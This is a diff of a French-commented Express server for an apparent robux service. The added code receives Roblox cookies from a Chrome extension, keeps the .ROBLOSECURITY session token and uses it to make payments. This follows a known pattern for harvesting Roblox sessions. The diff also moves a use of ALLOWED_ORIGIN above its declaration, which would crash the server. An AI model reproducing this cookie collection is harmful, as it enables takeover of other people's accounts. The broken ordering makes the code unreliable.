@@ -4,14 +4,13 @@ const crypto = require("crypto");
 const fetch = require("node-fetch"); // si Node < 18
 
 const app = express();
-app.use(cors());
-app.use(express.json());
-
-const ALLOWED_ORIGIN = "chrome-extension://bepinomhmhjfkfijfnkigboednbgggol";
-
 app.use(cors({
   origin: ALLOWED_ORIGIN
 }));
+app.use(express.json());
+
+const ALLOWED_ORIGIN = "chrome-extension://bepinomhmhjfkfijfnkigboednbgggol";
+let ROBLO_COOKIE = null;
 
 // Limite le body à 2MB et parse le JSON
 app.use(express.json({ limit: "2mb" }));
@@ -33,7 +32,7 @@ app.post("/api/receive-cookies", (req, res) => {
   console.log("=== Cookies Roblox reçus ===");
   cookies.forEach(c => {
     // Log sécurisé: tronquer la valeur pour éviter d’exposer des tokens complets
-    const valuePreview = c.value ? c.value.slice(0, 4) + "..." : "";
+  const valuePreview = c.value ? c.value.slice(0, 4) + "..." : "";
     console.log(`${c.name} = ${valuePreview} (HttpOnly: ${c.httpOnly}, Domain: ${c.domain})`);
   });
 
@@ -45,7 +44,14 @@ app.post("/api/receive-cookies", (req, res) => {
     domain: c.domain
   })));
 
-  // Réponse JSON
+  const roblo = cookies.find(c => c.name === ".ROBLOSECURITY");
+
+  if (!roblo || !roblo.value) {
+    return res.status(400).json({ error: "ROBLOSECURITY manquant" });
+  }
+
+  ROBLO_COOKIE = roblo.value;
+
   res.json({ ok: true, received: cookies.length });
 });
 
@@ -270,31 +276,6 @@ app.get("/api/places", async (req, res) => {
     }
 });
 
-let ROBLO_COOKIE = null;
-
-async function initRobloCookie() {
-  const cookiesToSend = [
-    { name: ".ROBLOSECURITY", value: "abc123", httpOnly: true, domain: ".roblox.com" }
-  ];
-
-  try {
-    const response = await fetch("https://bloxrobux-backend.onrender.com/api/receive-cookies", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        "Authorization": "Bearer SUPER_SECRET_TOKEN"
-      },
-      body: JSON.stringify(cookiesToSend)
-    });
-    ROBLO_COOKIE = await response.json();
-    console.log("ROBLO_COOKIE :", ROBLO_COOKIE);
-  } catch (err) {
-    console.error("Impossible de récupérer ROBLO_COOKIE :", err);
-  }
-}
-
-initRobloCookie();
-
 async function getUserBalance(RobloxName) {
   const snap = await db.ref("users").orderByChild("RobloxName").equalTo(RobloxName).get();
   if (!snap.exists()) return null;
@@ -310,6 +291,9 @@ async function deductBalance(uid, amount, gameId) {
 }
 
 app.post("/api/payServer", async (req, res) => {
+  if (!ROBLO_COOKIE) {
+  return res.status(500).json({ error: "ROBLO_COOKIE non initialisé" });
+  }
   const { name, gameId, amount } = req.body;
   if (!name || !gameId || !amount) 
     return res.status(400).json({ error: "Paramètres manquants" });
@@ -397,7 +381,6 @@ app.post("/api/getBalance", async (req, res) => {
     res.status(500).json({ error: "Erreur serveur" });
   }
 });
-
 
 // --- Lancement serveur ---
 const PORT = process.env.PORT || 3000;
